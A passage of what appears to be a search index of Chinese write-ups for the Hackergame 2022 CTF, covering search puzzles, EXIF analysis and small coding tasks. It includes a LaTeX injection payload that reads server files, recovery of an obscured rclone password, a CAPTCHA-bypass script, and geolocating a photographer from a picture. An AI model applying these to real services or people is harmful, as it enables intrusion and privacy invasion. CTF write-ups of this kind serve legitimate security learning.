\u4ecd\u7136\u4f7f\u7528\u7740\u4e00\u53f0\u4ed6\u4ece\u5c0f\u7528\u5230\u5927\u7684 Windows 2000 \u8ba1\u7b97\u673a\u3002\u90a3\u4e48\uff0c\u5728\u4e0d\u53d8\u66f4\u7cfb\u7edf\u914d\u7f6e\u548c\u7a0b\u5e8f\u4ee3\u7801\u7684\u524d\u63d0\u4e0b\uff0cFirefox \u6d4f\u89c8\u5668\u80fd\u5728 Windows 2000 \u4e0b\u8fd0\u884c\u7684\u6700\u540e\u4e00\u4e2a\u5927\u7248\u672c\u53f7\u662f\u591a\u5c11\uff1f</li> </ol> <p>\u641c\u7d22 \u201cFirefox Windows 2000\u201d \u53ef\u4ee5\u770b\u5230 Firefox 13 \u4e0d\u518d\u652f\u6301 Windows 2000 \u7684\u5f88\u591a\u65b0\u95fb\u3002</p> <p>\u6240\u4ee5\u7b54\u6848\u662f 12\u3002</p> <ol> <li>\u4f60\u77e5\u9053 PwnKit\uff08CVE-2021-4034\uff09\u55b5\uff1f\u636e\u53ef\u9760\u8c23\u4f20\uff0c\u51fa\u9898\u7ec4\u7684\u67d0\u4f4d\u540c\u5b66\u672c\u6765\u60f3\u51fa\u8fd9\u6837\u4e00\u9053\u7c7b\u4f3c\u7684\u9898\uff0c\u4f46\u662f\u53d1\u73b0 Linux \u5185\u6838\u66f4\u65b0\u4e4b\u540e\u5c45\u7136\u4e0d\u518d\u5141\u8bb8 argc \u4e3a 0 \u4e86\u55b5\uff01\u90a3\u4e48\uff0c\u8bf7\u627e\u51fa\u5728 Linux \u5185\u6838 master \u5206\u652f\uff08torvalds/linux.git\uff09\u4e0b\uff0c\u9996\u4e2a\u53d8\u52a8\u6b64\u884c\u4e3a\u7684 commit \u7684 hash \u5427\u55b5\uff01</li> </ol> <p>\u5728 Linux \u5185\u6838 GitHub dev \u9875\u9762\u5168\u5c40\u641c\u7d22\u4e86\u4e00\u4e0b argc == 0\uff0c\u53d1\u73b0\u4e86\u4e00\u4e9b\u68c0\u67e5\u3002\u627e\u5230\u4e2a\u6bd4\u8f83\u50cf\u7684\u8fdb\u5230\u9875\u9762\u91cc blame\uff0c\u627e\u5230\u4e86 commit\uff1aexec: Force single empty string when argv is empty\uff08\u5176\u5b9e commit message \u91cc\u5c31\u5199\u4e86 CVE-2021-4034\uff09\u3002</p> <p>\u6240\u4ee5\u7b54\u6848\u662f dcd46d897adb70d63e025f175a00a89797d31a43\u3002</p> <ol> <li>\u901a\u8fc7\u76d1\u89c6\u732b\u54aa\u5728\u952e\u76d8\u4e0a\u770b\u4f3c\u4e71\u8e29\u7684\u6545\u610f\u884c\u4e3a\uff0c\u4e0d\u51fa\u6240\u6599\u53d1\u73b0\u5176\u79d8\u5bc6\u8fde\u4e0a\u4e86\u4e00\u4e2a ssh \u670d\u52a1\u5668\uff0c\u7ec8\u7aef\u663e\u793a <code>ED25519 key fingerprint is MD5:e4:ff:65:d7:be:5d:c8:44:1d:89:6b:50:f5:50:a0:ce.</code>\uff0c\u4f60\u77e5\u9053\u732b\u54aa\u5728\u8fde\u63a5\u4ec0\u4e48\u57df\u540d\u5417\uff1f</li> </ol> <p>\u6bd4\u8f83\u96be\u641e\u7684\u4e00\u9053\u9898\uff0c\u60f3\u4e86\u5f88\u957f\u65f6\u95f4\uff0c\u751a\u81f3\u4ee5\u4e3a\u662f\u4e00\u4e9b crypto \u9898\u3002\u4e0d\u8fc7\u6bd5\u7adf\u662f\u4e00\u9053\u641c\u7d22\u9898\uff0c\u4e8e\u662f\u76f4\u63a5\u628a md5 fingerprint \u603c\u5230\u8c37\u6b4c\u91cc\uff0c\u641c\u5230\u4e86\u4e00\u4e2a\u6587\u6863\u5176\u4e2d\u6709\u8fd9\u4e2a\uff08\u53ef\u80fd\u662f\u505a\u4e2a\u4f8b\u5b50\uff09\uff1aZeek Logs &gt; ssh.log\u3002\u770b\u5230\u91cc\u9762\u5bf9\u5e94\u7684 ip\uff1a205.166.94.16\uff0c\u8bbf\u95ee\u8fdb\u53bb\u770b\u5230\u4e86 sdf.org \u57df\u540d\u3002</p> <p>\u6240\u4ee5\u7b54\u6848\u662f sdf.org\u3002\uff08\u5176\u5b9e\u662f\u56e4 flag \u9636\u6bb5\u624d\u505a\u51fa\u6765\u7684\uff09</p> <ol> <li>\u4e2d\u56fd\u79d1\u5b66\u6280\u672f\u5927\u5b66\u53ef\u4ee5\u51fa\u6821\u8bbf\u95ee\u56fd\u5185\u56fd\u9645\u7f51\u7edc\u4ece\u800c\u5141\u8bb8\u4e91\u64b8\u732b\u7684\u201c\u7f51\u7edc\u901a\u201d\u5b9a\u4ef7\u4e3a 20 \u5143\u4e00\u4e2a\u6708\u662f\u4ece\u54ea\u4e00\u5929\u6b63\u5f0f\u5b9e\u884c\u7684\uff1f</li> </ol> <p>\u641c\u4e86\u4e00\u4e0b\uff0c\u53d1\u73b0\u4e86\u4e00\u7bc7\u901a\u77e5\uff1a\u5173\u4e8e\u5b9e\u884c\u65b0\u7684\u7f51\u7edc\u8d39\u7528\u5206\u62c5\u529e\u6cd5\u7684\u901a\u77e5\uff0c\u662f 2011 \u5e74 1 \u6708 1 \u65e5\u65bd\u884c\u7684\uff0c\u4f46\u662f\u8fd9\u7bc7\u901a\u77e5\u91cc\u56fd\u9645\u7f51\u7edc\u901a\u8d39\u7528\u5e76\u6ca1\u6709\u6539\u53d8\uff0c\u8fd8\u662f 20 \u5143\u3002\u770b\u6765\u662f\u6bd4\u8f83\u4e45\u8fdc\u7684\u4e8b\u60c5\u4e86\u3002\u641c\u7d22\u540c\u540d\u901a\u77e5\uff0c\u53ef\u4ee5\u53d1\u73b0\u53e6\u4e00\u7bc7\u3002\u91cc\u9762\u5199\u4e86\u56fd\u9645\u7f51\u7edc\u901a\u5b9a\u4ef7 20 \u5143\uff0c2003 \u5e74 3 \u6708 1 \u65e5\u5b9e\u884c\u3002</p> <p>\u6240\u4ee5\u7b54\u6848\u662f 2003-03-01\u3002</p> <p>\u4ea4\u4e0a\u53bb\u5f97\u5230\u4e24\u4e2a flag\uff08\u4e00\u4e2a\u662f\u5bf9\u4e09\u9053\u9898\u7684\uff0c\u4e00\u4e2a\u662f\u5bf9\u516d\u9053\u9898\u7684\uff09\uff1a flag{meowexammeow_\u2026\u2026} flag{meowexamfullymeowed!_\u2026\u2026}</p>"}, {"location": "writeups/hackergame2022/#_3", "title": "\u5bb6\u76ee\u5f55\u91cc\u7684\u79d8\u5bc6", "text": "<p>\u5b9e\u9a8c\u5ba4\u7ed9\u5c0f K \u5206\u914d\u4e86\u4e00\u4e2a\u9ad8\u6027\u80fd\u670d\u52a1\u5668\u7684\u8d26\u6237\uff0c\u4e3a\u4e86\u4e0d\u7528\u91cd\u65b0\u914d\u7f6e VSCode, Rclone \u7b49\u5c0f K \u5e38\u7528\u7684\u751f\u4ea7\u529b\u5de5\u5177\uff0c\u6700\u7b80\u5355\u7684\u65b9\u6cd5\u5f53\u7136\u662f\u628a\u81ea\u5df1\u7684\u5bb6\u76ee\u5f55\u6253\u5305\u62f7\u8d1d\u8fc7\u53bb\u3002</p> <p>\u4f46\u662f\u5f88\u4e0d\u5de7\uff0c\u5bf9\u5b58\u653e\u4e8e\u5c0f K \u7535\u8111\u91cc\u7684 Hackergame 2022 \u7684 flag \u89ca\u89ce\u5df2\u4e45\u7684 Eve \u540c\u5b66\u6070\u597d\u6700\u8fd1\u62ff\u5230\u4e86\u8fd9\u4e2a\u670d\u52a1\u5668\u7684\u7ba1\u7406\u5458\u6743\u9650\uff08\u901a\u8fc7\u89ca\u89ce\u53e6\u4e00\u4f4d\u540c\u5b66\u7684\u654f\u611f\u4fe1\u606f\uff09\uff0c\u4e8e\u662f\u4e5f\u62ff\u5230\u4e86\u5c0f K \u540c\u5b66\u5bb6\u76ee\u5f55\u7684\u538b\u7f29\u5305\u3002</p> <p>\u7136\u800c\u66f4\u4e0d\u5de7\u7684\u662f\uff0c\u7531\u4e8e Hackergame \u90e8\u7f72\u4e86\u57fa\u4e8e\u9b54\u6cd5\u7684\u4f5c\u5f0a\u884c\u4e3a\u9884\u77e5\u7cfb\u7edf\uff0cEve \u540c\u5b66\u8fd8\u672a\u6765\u5f97\u53ca\u89e3\u538b\u538b\u7f29\u5305\u5c31\u88ab Z \u540c\u5b66\u63d0\u524d\u6293\u83b7\u3002</p> <p>\u4e3a\u4e86\u8bc1\u660e Eve \u540c\u5b66\u4e0d\u826f\u4f01\u56fe\u7684\u5371\u5bb3\u6027\uff0c\u4f60\u80fd\u5728\u8fd9\u4e2a\u538b\u7f29\u5305\u91cc\u627e\u5230\u91cd\u8981\u7684 flag \u4fe1\u606f\u5417\uff1f</p> <p>\u7ed9\u4e86\u4e00\u4e2a\u7528\u6237\u5bb6\u76ee\u5f55\u7684\u538b\u7f29\u5305\uff0c\u8fdb\u53bb\u5168\u5c40\u641c\u7d22\u4e00\u4e0b flag \u53ef\u4ee5\u53d1\u73b0 VSCode \u7684\u5386\u53f2\u6587\u4ef6\u91cc\u6709\u4e00\u4e2a DUGV.c \u91cc\u6709\u4e00\u4e2a\u6ce8\u91ca\u6389\u7684 flag\uff1aflag{finding_everything_through_vscode_config_file_\u2026\u2026}\uff08\u62a2\u4e86\u4e2a\u4e00\u8840 2333\uff09</p> <p>\u7b2c\u4e8c\u90e8\u5206\u8fd8\u662f\u6709\u4e9b\u590d\u6742\u7684\u3002\u641c flag \u7684\u65f6\u5019\u8fd8\u53ef\u4ee5\u53d1\u73b0 .config/rclone/rclone.conf \u91cc\u6709\u4e00\u4e2a\u540d\u4e3a flag2 \u7684\u914d\u7f6e\u9879\uff1a <pre><code>[flag2]\ntype = ftp\nhost = ftp.example.com\nuser = user\npass = tqqTq4tmQRDZ0sT_leJr7-WtCiHVXSMrVN49dWELPH1uce-5DPiuDtjBUN3EI38zvewgN5JaZqAirNnLlsQ\n</code></pre></p> <p>\u6ca1\u7528\u8fc7 rclone\uff0c\u81ea\u5df1\u88c5\u4e86\u4e00\u4e2a\u8bd5\u4e86\u4e00\u4e0b\uff0c\u53d1\u73b0 pass \u662f\u6df7\u6dc6\u540e\u7684\uff0c\u800c\u4e14\u662f\u968f\u673a\u7684\uff0c\u6709\u4e00\u4e2a\u547d\u4ee4 rclone obscure \u53ef\u4ee5\u7528\u6765\u6df7\u6dc6\u5bc6\u7801\u3002\u6587\u6863\u91cc\u4e5f\u8bf4\u4e86\u6df7\u6dc6\u7684\u76ee\u7684\u4e5f\u53ea\u662f\u9632\u6b62\u6709\u4eba\u53ef\u4ee5\u4e00\u773c\u770b\u5230\u5bc6\u7801\u800c\u5df2\uff0c\u5e76\u6ca1\u6709\u52a0\u5bc6\uff0crclone \u662f\u53ef\u4ee5\u76f4\u63a5\u590d\u539f\u660e\u6587\u7684\u3002\u4e8e\u662f\u5c31\u7ffb\u4e86\u4e0b rclone \u6e90\u7801\uff0c\u53ef\u4ee5\u5728 obscure \u76f8\u5173\u6e90\u7801 \u91cc\u627e\u5230\u6062\u590d\u76f8\u5173\u7684\u51fd\u6570 Reveal\uff0c\u590d\u5236\u4e0b\u6765\u8dd1\u4e00\u4e0b\u7ed9\u51fa\u7684 pass \u5373\u53ef\u4ee5\u6062\u590d\u5bc6\u7801\uff0c\u5373\uff1aflag{get_rclone_password_from_config!_\u2026\u2026}</p>"}, {"location": "writeups/hackergame2022/#heilang", "title": "HeiLang", "text": "<p>\u6765\u81ea Heicore \u793e\u533a\u7684\u65b0\u4e00\u4ee3\u7f16\u7a0b\u8bed\u8a00 HeiLang\uff0c\u57fa\u4e8e\u7b2c\u4e09\u4ee3\u5927\u87d2\u86c7\u8bed\u8a00\uff0c\u4f46\u662f\u629b\u5f03\u4e86\u539f\u6709\u7684\u96be\u4ee5\u7406\u89e3\u7684 | \u8fd0\u7b97\uff0c\u5347\u7ea7\u4e3a\u4e86\u66f4\u52a0\u5148\u8fdb\u7684\u8bed\u6cd5\uff0c\u7528 A[x | y | z] = t \u6765\u8868\u793a\u4e4b\u524d\u590d\u6742\u7684 A[x] = t; A[y] = t; A[z] = t\u3002</p> <p>\u4f5c\u4e3a\u4e00\u4e2a\u7f16\u7a0b\u7231\u597d\u8005\uff0c\u6211\u89c9\u5f97\u5b9e\u5728\u662f\u592a\u9177\u4e86\uff0c\u5f88\u7b26\u5408\u6211\u5bf9\u672a\u6765\u7f16\u7a0b\u8bed\u8a00\u7684\u60f3\u8c61\uff0c\u79d1\u6280\u5e76\u5e26\u7740\u8da3\u5473\u3002</p> <p>\u9898\u7ed9\u4e86\u4e00\u4e2a\u4ee5\u8fd9\u79cd\u8bed\u6cd5\u5199\u7684\u751f\u6210\u6570\u7ec4\u7684\u4ee3\u7801\uff0c\u4ee5\u53ca\u9a8c\u8bc1\u7ed3\u679c\u7684 python \u4ee3\u7801\u3002\u5176\u5b9e\u9898\u76ee\u5df2\u7ecf\u8bf4\u7684\u5f88\u660e\u786e\u4e86\uff0c\u4e0d\u8fc7\u61d2\u5f97\u5199\uff0c\u8bb0\u5f97 GitHub \u4e0a\u770b\u5230\u8fc7\u4e00\u4e2a\u9879\u76ee HeLang\uff0c\u4e0d\u8fc7\u91cc\u9762\u7684\u6570\u7ec4\u4e0b\u6807\u4ece 1 \u5f00\u59cb\uff0c\u6240\u4ee5\u5c31\u5199\u4e86\u6bb5\u4ee3\u7801\u6765\u5c06 [] \u4e2d\u7684\u6570\u90fd\u52a0\u4e00\uff0c\u8dd1\u4e00\u904d\u8f93\u51fa\u6570\u7ec4 a\uff0c\u7136\u540e\u66ff\u4ee3\u539f\u6765\u6587\u4ef6\u91cc\u7684\u90e8\u5206\uff0c\u8dd1\u4e00\u4e0b\u5c31\u53ef\u4ee5\u62ff\u5230 flag\uff1aflag{6d9ad6e9a6268d96-97091f6fffb6935c}</p>"}, {"location": "writeups/hackergame2022/#xcaptcha", "title": "Xcaptcha", "text": "<p>\u9898\u76ee\u592a\u957f\u4e86\uff0c\u7701\u7565\u4e86\u90e8\u5206\u80cc\u666f\u6545\u4e8b</p> <p>\u4f17\u4eba\u76ee\u76ee\u76f8\u89d1\u3002</p> <p>\u300c\u6211\u6765\u8bd5\u8bd5\u3002\u300d\uff0c\u4e00\u540d\u961f\u5458\u4e0a\u524d\u70b9\u51fb\u4e86\u6309\u94ae\u3002\u7136\u540e\uff0c\u5c4f\u5e55\u663e\u793a\u300c\u8bf7\u5728\u4e00\u79d2\u5185\u5b8c\u6210\u4ee5\u4e0b\u52a0\u6cd5\u8ba1\u7b97\u300d\u3002</p> <p>\u8fd8\u6ca1\u7b49\u53cd\u5e94\u8fc7\u6765\uff0c\u5c4f\u5e55\u4e0a\u7684\u5b57\u53c8\u5f00\u59cb\u53d8\u5e7b\uff0c\u663e\u793a\u7740\u300c\u9a8c\u8bc1\u5931\u8d25\u300d\u3002\u800c\u4f60\u4f5c\u4e3a\u7a81\u51fb\u961f\u4e2d\u552f\u4e00\u7684\u9ed1\u5ba2\uff0c\u5168\u6751\u4eba\u6c11\u6700\u540e\u7684\u5e0c\u671b\uff0c\u8fce\u7740\u7eb7\u7eb7\u6295\u6765\u7684\u76ee\u5149\uff0c\u80fd\u5426\u5728\u89c4\u5b9a\u65f6\u95f4\u5185\u5b8c\u6210\u9a8c\u8bc1\uff0c\u6253\u5f00\u673a\u623f\uff0c\u4e0d\uff0c\u63a8\u5f00\u548c\u5e73\u65f6\u4ee3\u7684\u5927\u95e8\uff1f</p> <p>\u5927\u6982\u5c31\u662f\u70b9\u51fb\u8ba4\u8bc1\u540e\u5728\u4e00\u79d2\u5185\u8ba1\u7b97\u4e09\u4e2a\u5927\u6574\u6570\u52a0\u6cd5\u7136\u540e\u63d0\u4ea4\u3002\u624b\u5feb\u5b58\u4e00\u4efd html\uff0c\u6309\u7167\u5176\u4e2d\u8981\u6c42\u6b63\u5219\u4e00\u4e0b\u63d0\u53d6\u51fa\u7b97\u5f0f\u7136\u540e\u505a\u52a0\u6cd5\u518d post \u56de\u53bb\u3002</p> <pre><code>import re, requests\nurl = \"http://202.38.93.111:10047/xcaptcha\"\ns = requests.session()\ns.get(\"http://202.38.93.111:10047/?token=\u2026\u2026\")\nres = re.findall(r\"&gt;(\\d*?)\\+(\\d*?) \", s.get(url).text)\nprint(s.post(url, data={f'captcha{i+1}': str(int(res[i][0]) + int(res[i][1])) for i in range(3)}).text)\n</code></pre> <p>\uff08\u7ecf\u5178\u538b\u884c\uff09\u8dd1\u4e00\u4e0b\u62ff\u5230 flag\uff1aflag{head1E55_br0w5er_and_ReQuEsTs_areallyour_FR1ENd_\u2026\u2026}</p>"}, {"location": "writeups/hackergame2022/#latex", "title": "LaTeX \u673a\u5668\u4eba", "text": "<p>\u5728\u7f51\u4e0a\u793e\u4ea4\u7fa4\u7ec4\u4e2d\u4ea4\u6d41\u6570\u5b66\u548c\u7269\u7406\u95ee\u9898\u65f6\uff0c\u603b\u662f\u514d\u4e0d\u4e86\u8f93\u5165\u516c\u5f0f\u3002\u800c\u663e\u7136\u5927\u591a\u6570\u5e38\u7528\u7684\u804a\u5929\u8f6f\u4ef6\u5e76\u4e0d\u80fd\u505a\u5230\u8fd9\u4e00\u70b9\u3002\u4e3a\u4e86\u65b9\u4fbf\u5927\u5bb6\u5728\u6c34\u7fa4\u548c\u5356\u5f31\u4e4b\u4f59\u80fd\u591f\u9ad8\u6548\u5730\u8fdb\u884c\u5b66\u672f\u4ea4\u6d41\uff0cG \u793e\u7684\u540c\u5b66\u5236\u4f5c\u4e86\u4e00\u4e2a\u7b80\u5355\u6613\u7528\u7684\u5c06 LaTeX \u516c\u5f0f\u4ee3\u7801\u8f6c\u6362\u6210\u56fe\u7247\u7684\u7f51\u7ad9\uff0c\u5e76\u901a\u8fc7\u804a\u5929\u673a\u5668\u4eba\u5728\u7fa4\u91cc\u5b9e\u65f6\u5c06\u7fa4\u53cb\u53d1\u9001\u7684\u516c\u5f0f\u8f6c\u6362\u6210\u56fe\u7247\u53d1\u51fa\u3002</p> <p>\u8fd9\u4e2a\u7f51\u7ad9\u7684\u601d\u8def\u4e5f\u5f88\u76f4\u63a5\uff1a\u628a\u7528\u6237\u8f93\u5165\u7684 LaTeX \u63d2\u5165\u5230\u4e00\u4e2a\u5199\u597d\u5934\u90e8\u548c\u5c3e\u90e8\u7684 TeX \u6587\u4ef6\u4e2d\uff0c\u5c06\u6587\u4ef6\u7f16\u8bd1\u6210 PDF\uff0c\u518d\u5c06 PDF \u88c1\u526a\u6210\u5927\u5c0f\u5408\u9002\u7684\u56fe\u7247\u3002</p> <p>\u201cLaTeX \u53c8\u4e0d\u662f\u88ab\u7f16\u8bd1\u6267\u884c\u7684\u4ee3\u7801\uff0c\u8fd9\u79cd\u4e1c\u897f\u4e0d\u4f1a\u6709\u4e8b\u7684\u3002\u201d</p> <p>\u7269\u7406\u51fa\u8eab\u7684\u5f00\u53d1\u8005\u4eec\u660e\u663e\u4e0d\u662f\u592a\u5728\u610f\u8fd9\u4e2a\u7f51\u7ad9\u7684\u5b89\u5168\u95ee\u9898\uff0c\u4e5f\u6ca1\u6709\u5bf9\u7528\u6237\u7684\u8f93\u5165\u505a\u4efb\u4f55\u68c0\u67e5\u3002</p> <p>\u90a3\u4f60\u80fd\u60f3\u529e\u6cd5\u83b7\u5f97\u670d\u52a1\u5668\u4e0a\u653e\u5728\u6839\u76ee\u5f55\u4e0b\u7684 flag \u5417\uff1f</p> <p>\u7eaf\u6587\u672c</p> <p>\u7b2c\u4e00\u4e2a flag \u4f4d\u4e8e /flag1\uff0cflag \u82b1\u62ec\u53f7\u5185\u7684\u5185\u5bb9\u7531\u7eaf\u6587\u672c\u7ec4\u6210\uff08\u5373\u53ea\u5305\u542b\u5927\u5199\u5c0f\u5199\u5b57\u6bcd\u548c\u6570\u5b57 0-9\uff09\u3002</p> <p>\u7279\u6b8a\u5b57\u7b26\u6df7\u5165</p> <p>\u7b2c\u4e8c\u4e2a flag \u4f4d\u4e8e /flag2\uff0c\u8fd9\u6b21\uff0cflag \u82b1\u62ec\u53f7\u5185\u7684\u5185\u5bb9\u9664\u4e86\u5b57\u6bcd\u548c\u6570\u5b57\u4e4b\u5916\uff0c\u8fd8\u6df7\u5165\u4e86\u4e24\u79cd\u7279\u6b8a\u5b57\u7b26\uff1a\u4e0b\u5212\u7ebf\uff08_\uff09\u548c\u4e95\u53f7\uff08#\uff09\u3002\u4f60\u53ef\u80fd\u9700\u8981\u60f3\u4e9b\u5176\u4ed6\u529e\u6cd5\u4e86\u3002</p> <p>\u7b2c\u4e00\u4e2a flag \u5f88\u7b80\u5355\uff0c\u53ea\u9700\u8981 input \u4e00\u4e0b\u5373\u53ef\uff1a<code>\\input{/flag1}</code>\uff0c\u53ef\u4ee5\u770b\u5230 flag\uff1aflag{becAr3fu11dUd3\u2026\u2026}\u3002</p> <p>\u7b2c\u4e8c\u4e2a flag \u56e0\u4e3a\u91cc\u9762\u5305\u542b\u7279\u6b8a\u5b57\u7b26\uff0c\u6240\u4ee5\u5728\u6e32\u67d3\u7684\u65f6\u5019\u4f1a\u51fa\u73b0\u9519\u8bef\u3002\u89e3\u51b3\u65b9\u6848\u662f\u5229\u7528 LaTeX \u7684 active character \u6982\u5ff5\u6765\u5c06 _ \u548c # \u66ff\u6362\u4e3a \\_ \u548c \\#\uff0c\u5148\u5c06\u5176\u5b57\u7b26\u7684 catcode \u8bbe\u7f6e\u4e3a \\active\uff0c\u7136\u540e\u5b9a\u4e49\u547d\u4ee4\u5e8f\u5217\u3002payload \u4e3a\uff1a <pre><code>$$\\catcode`\\_=\\active \\def_{\\_} \\catcode`\\#=\\active \\def#{\\#}\\input{/flag2}$$\n</code></pre> \u5f97\u5230 flag\uff1aflag{latex_bec_0_m##es_co__#ol_\u2026\u2026}</p>"}, {"location": "writeups/hackergame2022/#_4", "title": "\u94fe\u4e0a\u8bb0\u5fc6\u5927\u5e08", "text": "<p>\u542c\u8bf4\u4f60\u5728\u533a\u5757\u94fe\u4e0a\u90e8\u7f72\u7684\u667a\u80fd\u5408\u7ea6\u6709\u8fc7\u76ee\u4e0d\u5fd8\u7684\u80fd\u529b\u3002</p> <p>\u7b2c\u4e00\u9053\u9898\u9898\u76ee\u5408\u7ea6\uff1a <pre><code>pragma solidity =0.8.17;\n\ninterface MemoryMaster {\n    function memorize(uint256 n) external;\n    function recall() external view returns (uint256);\n}\n\ncontract Challenge {\n    function test(MemoryMaster m, uint256 n) external returns (bool) {\n        m.memorize(n);\n        uint256 recalled = m.recall();\n        return recalled == n;\n    }\n}\n</code></pre></p> <p>\u5f88\u7b80\u5355\uff0c\u5199\u4e00\u4e2a\u5408\u7ea6\u5b58\u503c\uff0c\u5b9e\u73b0 memorize \u548c recall \u65b9\u6cd5\u5b58\u53d6\u503c\u5373\u53ef\uff1a <pre><code>pragma solidity =0.8.17;\n\ncontract Exploit {\n    uint256 num;\n    function memorize(uint256 n) external {\n        num = n;\n    }\n    function recall() external view returns(uint256) {\n        return num;\n    }\n}\n</code></pre></p> <p>Remix \u91cc\u7f16\u8bd1\u7136\u540e\u4e0a\u4f20\u5373\u53ef\uff0cflag\uff1aflag{Y0u_Ar3_n0w_f4M1l1ar_W1th_S0l1dity_st0rage_\u2026\u2026}</p> <p>\u7b2c\u4e00\u9898\u62a2\u4e86\u4e00\u8840\u3002\u7b2c\u4e8c\u4e09\u9898\u770b\u4e86\u5c5e\u5b9e\u8499\u5708\u3002\u7b2c\u4e8c\u9898\u5728\u8c03\u7528 memorize \u4e4b\u540e\u63a5\u4e86\u4e00\u4e2a revert \u6062\u590d\u72b6\u6001\u53d8\u5316\u3002\u7b2c\u4e09\u9898\u9650\u5b9a memorize \u65b9\u6cd5\u4e3a view \u51fd\u6570\uff0c\u5373\u4e0d\u80fd\u4fee\u6539\u72b6\u6001\u3002\u611f\u89c9\u5f88\u795e\u5947\uff0c\u53ef\u80fd\u662f\u7528\u4e86\u67d0\u4e9b EVM \u7279\u6027\u5427\u3002\u8e72 wp \u5b66\u5b66\u3002</p>"}, {"location": "writeups/hackergame2022/#20", "title": "\u65c5\u884c\u7167\u7247 2.0", "text": "<p>\u4f60\u7684\u5b66\u957f\u51b3\u5b9a\u6765\u4e00\u573a\u84c4\u8c0b\u5df2\u4e45\u7684\u65c5\u884c\u3002\u901a\u8fc7\u4ed6\u53d1\u7ed9\u4f60\u7684\u7167\u7247\u6765\u770b\uff0c\u9152\u5e97\u5e94\u8be5\u662f\u53c8\u88ab\u4ed6\u4f4f\u4e0b\u4e86\u3002</p> <p></p>"}, {"location": "writeups/hackergame2022/#_5", "title": "\u7167\u7247\u5206\u6790", "text": "<p>\u7b2c\u4e00\u90e8\u5206\u662f\u4e94\u4e2a\u5173\u4e8e\u56fe\u7247 exif \u4fe1\u606f\u7684\u95ee\u9898\uff0c\u76f4\u63a5\u4f7f\u7528 exiftool \u8bfb\u53d6\u5373\u53ef\uff1a</p> <ol> <li>\u56fe\u7247\u6240\u5305\u542b\u7684 EXIF \u4fe1\u606f\u7248\u672c\u662f\u591a\u5c11\uff1f\uff08\u5982 2.1\uff09\u3002</li> </ol> <p>exiftool \u663e\u793a\u662f 0231\uff0c\u4f46\u5b9e\u9645\u4e0a\u662f 2.31\u3002</p> <ol> <li>\u62cd\u7167\u4f7f\u7528\u624b\u673a\u7684\u54c1\u724c\u662f\u4ec0\u4e48\uff1f</li> </ol> <p>exiftool \u53ef\u4ee5\u770b\u5230 <code>Make: Xiaomi</code>\uff0c\u6240\u4ee5\u7b54\u6848\u662f \u5c0f\u7c73/\u7ea2\u7c73\u3002</p> <ol> <li>\u8be5\u56fe\u7247\u88ab\u62cd\u6444\u65f6\u76f8\u673a\u7684\u611f\u5149\u5ea6\uff08ISO\uff09\u662f\u591a\u5c11\uff1f\uff08\u6574\u6570\u6570\u5b57\uff0c\u5982 3200\uff09</li> </ol> <p><code>ISO: 84</code>\uff0c\u6240\u4ee5\u7b54\u6848\u4e3a 84\u3002</p> <ol> <li>\u7167\u7247\u62cd\u6444\u65e5\u671f\u662f\u54ea\u4e00\u5929\uff1f\uff08\u683c\u5f0f\u4e3a\u5e74/\u6708/\u65e5\uff0c\u5982 2022/10/01\u3002\u6309\u62cd\u6444\u5730\u70b9\u5f53\u5730\u65e5\u671f\u8ba1\u7b97\u3002\uff09</li> </ol> <p><code>Create Date: 2022:05:14 18:23:35.220027+09:00</code>\uff0c\u6240\u4ee5\u7b54\u6848\u4e3a 2022/05/14\u3002</p> <ol> <li>\u7167\u7247\u62cd\u6444\u65f6\u662f\u5426\u4f7f\u7528\u4e86\u95ea\u5149\u706f\uff1f</li> </ol> <p><code>Flash: Off, Did not fire</code>\uff08\u6216\u8005\u770b\u53cd\u5149\u4e5f\u80fd\u770b\u51fa\u6765\uff09\u6240\u4ee5\u7b54\u6848\u4e3a \u5426\u3002</p> <p>flag\uff1aflag{1f_y0u_d0NT_w4nt_shOw_theSe_th3n_w1Pe_EXlF}</p>"}, {"location": "writeups/hackergame2022/#_6", "title": "\u793e\u5de5\u5b9e\u8df5", "text": "<p>\u63a5\u4e0b\u6765\u7b2c\u4e8c\u90e8\u5206\u662f\u4e94\u4e2a\u5173\u4e8e\u56fe\u7247\u793e\u5de5\u5206\u6790\u7684\u95ee\u9898\u3002</p> <ol> <li>\u8bf7\u5199\u51fa\u62cd\u7167\u4eba\u6240\u5728\u5730\u70b9\u7684\u90ae\u653f\u7f16\u7801\uff0c\u683c\u5f0f\u4e3a 3 \u81f3 10 \u4f4d\u6570\u5b57\uff0c\u4e0d\u542b\u7a7a\u683c\u6216\u4e0b\u5212\u7ebf\u7b49\u7279\u6b8a\u7b26\u53f7\uff08\u5982 230026\u300194720\uff09\u3002</li> </ol> <p>\u901a\u8fc7\u653e\u5927\u56fe\u7247\u53ef\u4ee5\u770b\u5230\u697c\u4e0b\u7684\u4f53\u80b2\u9986\u5916\u9762\u5199\u7684\u6709 \u201cZOZO\u201d \u6837\u5f0f\uff0c\u641c\u7d22\u53ef\u4ee5\u627e\u5230\u8fd9\u91cc\u662f\u65e5\u672c\u5343\u53f6\u6d77\u6d0b\u7403\u573a\u3002\u901a\u8fc7 Google \u5730\u56fe\u627e\u5230\u62cd\u7167\u4eba\u6240\u5728\u5730\u70b9\uff1aAPA HOTEL&amp; RESORT TOKYO BAY MAKUHARI \u3012261-0021 Chiba, Mihama Ward, Hibino, 2 Chome-3\uff0c\u6240\u4ee5\u90ae\u7f16\u4e3a 2610021\u3002\uff08\u8fd9\u91cc\u6709\u4e2a\u5751\uff0c\u65e5\u672c\u90ae\u7f16\u5212\u5206\u5f88\u7ec6\uff0c\u7403\u573a\u548c\u9152\u5e97\u7684\u90ae\u7f16\u4e0d\u4e00\u6837\uff0c\u6240\u4ee5\u8981\u6ce8\u610f\uff09</p> <ol> <li>\u7167\u7247\u7a97\u6237\u4e0a\u53cd\u5c04\u51fa\u4e86\u62cd\u7167\u4eba\u7684\u624b\u673a\u3002\u90a3\u4e48\u8fd9\u90e8\u624b\u673a\u7684\u5c4f\u5e55\u5206\u8fa8\u7387\u662f\u591a\u5c11\u5462\uff1f\uff08\u683c\u5f0f\u4e3a\u957f + \u5b57\u6bcd x + \u5bbd\uff0c\u5982 1920x1080\uff09</li> </ol> <p>\u901a\u8fc7\u4eac\u4e1c\u641c\u7d22\u5c0f\u7c73\u624b\u673a\uff0c\u4ee5\u53ca\u73bb\u7483\u53cd\u5149\u4e2d\u7684\u540e\u7f6e\u6444\u50cf\u5934\u6837\u5f0f\u53ef\u4ee5\u77e5\u9053\u8fd9\u90e8\u624b\u673a\u662f\u7ea2\u7c73 Note 9\uff0c\u5c4f\u5e55\u5206\u8fa8\u7387\u4e3a 2340x1080\u3002</p> <ol> 